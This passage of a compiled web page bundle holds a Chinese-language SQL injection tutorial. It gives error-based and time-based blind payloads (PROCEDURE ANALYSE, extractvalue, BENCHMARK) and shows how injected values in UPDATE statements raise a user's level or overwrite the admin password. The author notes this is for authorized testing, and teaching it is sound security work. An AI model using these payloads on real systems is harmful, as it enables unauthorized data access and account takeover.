INTO，INTO除非有写入shell的权限，否则是无法利用的;"),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"报错注入：")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(t.b)("pre",s({parentName:"div"},{className:"language-sql"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-sql"}),"?id",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"procedure")," analyse",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"extractvalue",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"rand",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),"concat",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"0x7e"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"database"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),";")))),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"时间型盲注：")),Object(t.b)("p",null,"直接使用sleep不行，需要用BENCHMARK代替"),Object(t.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(t.b)("pre",s({parentName:"div"},{className:"language-sql"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-sql"}),"?id",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"PROCEDURE")," analyse",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," extractvalue",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"rand",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),"concat",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"0x7e"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"IF"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token function"}),"MID"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"database"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")")," ",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"LIKE")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"5"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),",")," BENCHMARK",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"5000000"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),"SHA1",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")")))),Object(t.b)("h2",{className:"__internal",id:"sql里面只有update怎么利用？"},"SQL里面只有update怎么利用？",Object(t.b)("a",s({parentName:"h2"},{href:"#sql%E9%87%8C%E9%9D%A2%E5%8F%AA%E6%9C%89update%E6%80%8E%E4%B9%88%E5%88%A9%E7%94%A8%EF%BC%9F","aria-hidden":!0,className:"anchor"}),"#")),Object(t.b)("p",null,"这种方式会修改数据，很危险，在授权测试允许的情况下才考虑"),Object(t.b)("p",null,"一般在用户修改密码的地方"),Object(t.b)("p",null,"先理解这句 ",Object(t.b)("inlineCode",{parentName:"p"},"SQL")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(t.b)("pre",s({parentName:"div"},{className:"language-sql"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-sql"}),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"UPDATE")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"user")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"SET")," password",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token string"}),"'MD5($password)'"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),",")," homepage",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token string"}),"'$homepage'")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"WHERE")," id",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token string"}),"'$id'")))),Object(t.b)("p",null,"如果此 ",Object(t.b)("inlineCode",{parentName:"p"},"SQL")," 被修改成以下形式，就实现了注入"),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"1、修改 homepage 值为",Object(t.b)("a",s({parentName:"strong"},{href:"http://baidu.com'",target:"_blank"}),"http://baidu.com'"),", userlevel='3")),Object(t.b)("p",null,"之后SQL语句变为"),Object(t.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(t.b)("pre",s({parentName:"div"},{className:"language-sql"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-sql"}),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"UPDATE")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"user")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"SET")," password",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token string"}),"'mypass'"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),",")," homepage",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token string"}),"'http://baidu.com'"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),",")," userlevel",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token string"}),"'3'")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"WHERE")," id",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token string"}),"'$id'")))),Object(t.b)("p",null,Object(t.b)("inlineCode",{parentName:"p"},"userlevel")," 为用户级别"),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"2、修改 password 值为mypass)' WHERE username='admin'#")),Object(t.b)("p",null,"之后 ",Object(t.b)("inlineCode",{parentName:"p"},"SQL")," 语句变为"),Object(t.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(t.b)("pre",s({parentName:"div"},{className:"language-sql"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-sql"}),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"UPDATE")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"user")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"SET")," password",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token string"}),"'MD5(mypass)'")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"WHERE")," username",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token string"}),"'admin'"),Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),"#)', homepage='$homepage' WHERE id='$id'")))),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"3、修改 id 值为' OR username='admin'")),Object(t.b)("p",null,"之后 ",Object(t.b)("inlineCode",{parentName:"p"},"SQL")," 语句变为"),Object(t.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(t.b)("pre",s({parentName:"div"},{className:"language-sql"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-sql"}),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"UPDATE")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"user")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"SET")," password",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token string"}),"'MD5($password)'"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),",")," homepage",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token string"}),"'$homepage'")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"WHERE")," id",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token string"}),"''")," ",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"OR")," username",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token string"}),"'admin'")))))}b.isMDXComponent=!0,b=b}}]);